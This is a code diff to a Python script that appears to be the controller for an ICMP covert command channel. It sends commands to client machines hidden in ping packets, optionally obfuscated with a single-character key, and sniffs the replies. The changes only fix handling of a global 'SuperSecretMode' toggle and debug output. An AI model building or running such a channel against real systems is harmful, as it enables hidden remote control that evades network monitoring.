@@ -9,7 +9,7 @@ import threading
 DEBUG = True                   # Set to display statements after command execution
 DEVDEBUG = False               # Set to display statements specific to debugging issues
 JSONFILE = "example.json"      # Set to point to configuration files with loadclients
-global SuperSecretMode         # Enables "encryption"
+SuperSecretMode = False         # Enables "encryption"
 KEY = "B"
 
 def print_title(): 
@@ -69,6 +69,7 @@ def removeallclients(clients):
 
 # Send command to client by ID via ICMP data, max of 1472 data bytes
 def send_command(arguments, clients, execute):
+    global SuperSecretMode
     try:
         clientcommand = arguments[1] 
         clienttokens = clientcommand.split(" ", 1)
@@ -95,6 +96,7 @@ def encrypt_decrypt(plaintext):
 
 # Reduced redundency in options
 def send_over_icmp(clientip, command, execute):
+    global SuperSecretMode
     encrypted = encrypt_decrypt(command)
     if execute:
         if SuperSecretMode:
@@ -115,13 +117,14 @@ def send_over_icmp(clientip, command, execute):
 
 # Send command to all clients
 def sendtoall(arguments, clients, execute):
+    global SuperSecretMode
     if len(arguments)<2 or arguments[1] == "": 
         print("[ERROR] Usage: sendtoall <message>")
     else:
         for client in clients:
             send_over_icmp(clients.get(client), arguments[1], execute)
             if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
-            if DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
+            elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
 
 # Place icupS into single client mode
 def shell(clients, arguments):
@@ -167,18 +170,25 @@ def listen(pkt):
         if command[0] == "$":
             output = encrypt_decrypt(command[1:])
             print(f"Recieved:\n\t{output} from {src}")
-        else: print(f"Recieved:\n\t{command} from {src}")
+        else: print(f"Recieved:\n\t{command[0:2]} {command[2:]} from {src}")
 
 def sniffer():
     sniff(filter="icmp[icmptype] == icmp-echoreply", prn=listen)
 
-def main():
+def change_ssm():
     global SuperSecretMode
+    if SuperSecretMode: 
+        SuperSecretMode = False
+        print("SSM Disabled")
+    else: 
+        SuperSecretMode = True
+        print("SSM Enabled")
+
+def main():
     print_title()
     print("Enter command to begin, or \"help\" for help:")
     threading.Thread(target=sniffer, daemon=True).start()
     clients = dict()
-    SuperSecretMode = False
     id = 0
     while(True):
         command = input(">> ")
@@ -215,8 +225,7 @@ def main():
             print_title()
             break
         elif arguments[0] == "ssm":
-            if SuperSecretMode: SuperSecretMode = False, print("SSM Disabled")
-            else: SuperSecretMode = True, print("SSM Enabled")
+            change_ssm()
         elif arguments[0] == "help":
             print_help()
         else:
